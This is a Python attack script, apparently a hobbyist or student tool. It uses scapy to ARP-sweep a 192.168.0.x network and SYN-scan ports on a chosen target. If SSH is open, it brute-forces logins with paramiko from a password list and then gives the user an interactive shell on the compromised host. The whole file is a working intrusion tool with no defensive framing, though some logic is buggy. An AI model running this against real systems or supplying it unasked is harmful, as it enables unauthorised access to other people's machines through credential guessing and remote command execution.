from scapy.layers.inet import TCP, IP, ICMP
from scapy.layers.l2 import ARP, Ether
import paramiko
from scapy.all import *

Registered_Ports = range(1, 1023)
open_ports = []
SSHconn = paramiko.SSHClient()
SSHconn.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy)
passwords = open("passwordlist.txt").read().split("\n")
conf.verb = 0
def scanport(port):
        source_port = RandShort()
        synpkt = sr1(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5, verbose=0)
        if synpkt is not None:
            if synpkt.haslayer(TCP):
                if synpkt.getlayer(TCP).flags == 0x12:
                    rst_packet = sr(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2, verbose=0)
                    return True
            else:
                return False
def arpscanner():
    print('Starting network scan...')
    try:
        conf.verb = 0
        for address in range(1, 255):
            ip = f'192.168.0.{address}'
            arp_out = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
            arp_in = srp1(arp_out, timeout=1, verbose=0)
            if arp_in:
                print(f"IP: {arp_in.psrc}, MAC: {arp_in.hwsrc}")
    except Exception as error:
        print(error)
        return False
def icmp_send():
    try:
        icmp_packet = sr1(IP(dst=Target) / ICMP(), timeout=3)
        if icmp_packet is None:
            return False
        else:
            return True
    except Exception as error:
        print(error)
        return False
def bruteforce(user, password, host, port):
    try:
        SSHconn.connect(hostname=host, port=int(port), username=user, password=password, timeout=1)
        print(f'Logged in to the {user}, with the password: {password}')
        while True:
            try:
                cmd = input("command: ")
                if cmd.lower() == "exit":
                    exit(0)
                else:
                    stdin, stdout, stderr = SSHconn.exec_command(cmd)
                    print(stdout.read().decode("utf-8"), stderr.read().decode("utf-8"))
            except Exception as error:
                print(error)
    except paramiko.ssh_exception.AuthenticationException as error:
        print(f'[-]{error} - failed to connect.')
        return False
def looper(port, user):
    try:
        print(f"Starting the brute-force on: [{Target}:{port}, user: {user}...]")
        for passwd in passwords:
            print(f"[i] Trying combination: {user}:{passwd}")
            if bruteforce(user, passwd, Target, port):
                SSHconn.close()
                break
    except Exception as e:
        print(f'{e} failed')
def main():
    network_scanner = input(f'Would you like to run a network scanner first? [y/n]: ')
    network_scanner.lower()
    if network_scanner == "y":
        arpscanner()
        pass
    else:
        print("Proceeding.")
    global Target
    Target = input("Target IP: ")
    pass
    print(f'Starting port scanner on {Target}')
    for port in Registered_Ports:
        status = scanport(port)
        if status:
            open_ports.append(port)
            print(f"Port {port} is Open!")
    print("Scan is finished!")
    if 22 in open_ports:
        print(f'Open ports: {open_ports}')
        l_attack = input(f'Would you like to launch a brute-force attack on port 22? [y/n]: ')
        l_attack.lower()
        if l_attack == "y":
            with open(r"users.txt", "r") as user:
                print(f'[i] Choose the username from listed:\n{user.read()}')
            user = input(str("Select the user from the listed: "))
            looper(22, user)
        elif l_attack == "n":
            print('Selected "n". Exiting.')
        else:
            print("None selected. Exiting.")
if __name__ == "__main__":
    main()